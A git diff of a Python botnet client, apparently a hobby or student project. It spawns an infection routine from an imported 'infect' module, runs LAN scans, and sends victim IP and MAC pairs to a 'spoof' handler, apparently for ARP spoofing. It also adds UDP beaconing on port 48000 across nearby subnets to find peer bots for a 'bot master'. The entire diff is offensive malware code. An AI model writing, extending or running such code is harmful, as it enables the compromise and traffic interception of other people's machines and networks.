@@ -2,7 +2,8 @@ import multiprocessing
 import time
 import enum
 from infect import main_infect
-from botemp import run
+import threading
+import socket
 
 
 # the protocol
@@ -10,69 +11,142 @@ class Types(enum.Enum):
     COMMAND = 1
     COMMAND_RESULT = 2
 
-    NEW_CONNECTION = 3
-
-    KEEP_ALIVE = 4
-    KEEP_ALIVE_RESULT = 5
-
 
 # convert requests to the valid operation
 def convert(choice):
-    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "attack":
+    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_tree":
         return Types.COMMAND
-    elif choice == "cmdr":
+    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "tree_result":
         return Types.COMMAND_RESULT
-    elif choice == "new":
-        return Types.NEW_CONNECTION
-    elif choice == "keep":
-        return Types.KEEP_ALIVE
-    elif choice == "keepr":
-        return Types.KEEP_ALIVE_RESULT
     return None
 
 
 # handles all the commands
 def handle_command(data):
+    global choice, clients
     if data == "scan":
         parent_conn.send(data)
         clients = parent_conn.recv()
-        print("IP" + " " * 15 + "MAC")
-        if clients:
-            for client in clients:
-                print("{}   {}".format(client['ip'], client['mac']))
-        else:
-            print("scan failed")
+        # print("IP" + " " * 15 + "MAC")
+        # if clients:
+        #     for client in clients:
+        #         print("{}   {}".format(client['ip'], client['mac']))
+        # else:
+        #     print("scan failed")
+        choice = "scan_result"
+        return clients
 
     elif data.find("scan:") != -1:
         parent_conn.send(data)
         mac = parent_conn.recv()
-        print(mac)
+        # print(mac)
+        choice = "scan_result:"
+        clients.append({'ip': data.split(":")[1], 'mac': mac})
+        return mac
+
+    elif data.find("spoof:") != -1:
+        chosen_ip = data.split(":")[1]
+        chosen_mac = ""
+        for client in clients:
+            if client['ip'] == chosen_ip:
+                chosen_mac = client['mac']
+        parent_conn.send(data)
+        parent_conn.send(chosen_ip)
+        parent_conn.send(chosen_mac)
+        result = parent_conn.recv()
+        choice = "spoof_result"
+        return result
+
+    elif data == "get_tree":
+        choice = "tree_result"
+        return lan_tree
 
 
-# handles all the command's results
-def handle_command_result(data):
-    print("do command result")
+# handles all the command's results (sends back to the bot master)
+def handle_command_result(data, output):
+    if data == "scan_result":
+        print("IP" + " " * 15 + "MAC")
+        if output:
+            for client in output:
+                print("{}   {}".format(client['ip'], client['mac']))
+        else:
+            print("scan failed")
+
+    elif data == "scan_result:":
+        print(output)
+
+    elif data == "spoof_result":
+        print(output)
+
+    elif data == "tree_result":
+        print(output)
 
 
-# handles new connection
-def handle_new_connection(data):
-    print("do new conn")
+# sends to the entire network message to check for other bots
+def send_to_network():
+    sender_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        for host in ips:
+            sender_udp.sendto("####".encode(), (host, 48000))
+        time.sleep(30.0)
 
 
-# handles keep alive requests
-def handle_keep_alive(data):
-    print("do keep alive")
+# listening for bots in the LAN and answering them
+def recv_replies():
+    receiver_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    receiver_udp.bind(("0.0.0.0", 48000))
+    while True:
+        (reply, remote_address) = receiver_udp.recvfrom(4)
+        if reply.decode().find("#") != -1 and remote_address[0] not in lan_tree:
+            lan_tree.append(remote_address[0])
+            receiver_udp.sendto("####".encode(), (remote_address[0], 48000))
 
 
-# handles keep alive responses
-def handle_keep_alive_result(data):
-    print("do keep alive result")
+# prepares a list of ips to send them the bot message
+def ip_list():
+    ips = []
+    my_ip = ip
+    numbers = my_ip.split(".")
+    third_digit = str(int(numbers[2]) - 2)
+    fourth_digit = "1"
+
+    if int(third_digit) < 1:
+        third_digit = "1"
+
+    while int(third_digit) <= int(numbers[2]) + 2:
+        host = numbers[0] + "." + numbers[1] + "." + third_digit + "." + fourth_digit
+        ips.append(host)
+        if int(fourth_digit) < 255:
+            fourth_digit = str(int(fourth_digit) + 1)
+        else:
+            third_digit = str(int(third_digit) + 1)
+            fourth_digit = "1"
+
+    return ips
 
 
 if __name__ == '__main__':
+    # get ip
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+
+    ips = ip_list()
+    lan_tree = []
+
+    send_thread = threading.Thread(target=send_to_network)
+    recv_thread = threading.Thread(target=recv_replies)
+    send_thread.start()
+    recv_thread.start()
+
     can_infect = False
     # creating a duplex pipe for the IPC
     parent_conn, child_conn = multiprocessing.Pipe()
+    choice = ""
+    data = ""
+    output = ""
+    clients = []
 
     # tries to spawn the infection process
     try:
@@ -87,24 +161,18 @@ if __name__ == '__main__':
 
     # waiting for command (later receives from bot master)
     while True:
-        data = input("ins")
-        data_type = convert(data)
+        if choice == "":
+            choice = input("ins")
+
+        data = choice
+        data_type = convert(choice)
+        choice = ""
 
         if not data_type:
             print("invalid instruction")
 
         else:
             if data_type == Types.COMMAND:
-                handle_command(data)
+                output = handle_command(data)
             elif data_type == Types.COMMAND_RESULT:
-                handle_command_result(data)
-            elif data_type == Types.NEW_CONNECTION:
-                handle_new_connection(data)
-            elif data_type == Types.KEEP_ALIVE:
-                handle_keep_alive(data)
-            else:
-                handle_keep_alive_result(data)
-        # parent_conn, child_conn = multiprocessing.Pipe()
-        # p1 = multiprocessing.Process(target=run, args=(child_conn, ))
-        # p1.start()
-        # parent_conn.send(choice)
+                handle_command_result(data, output)
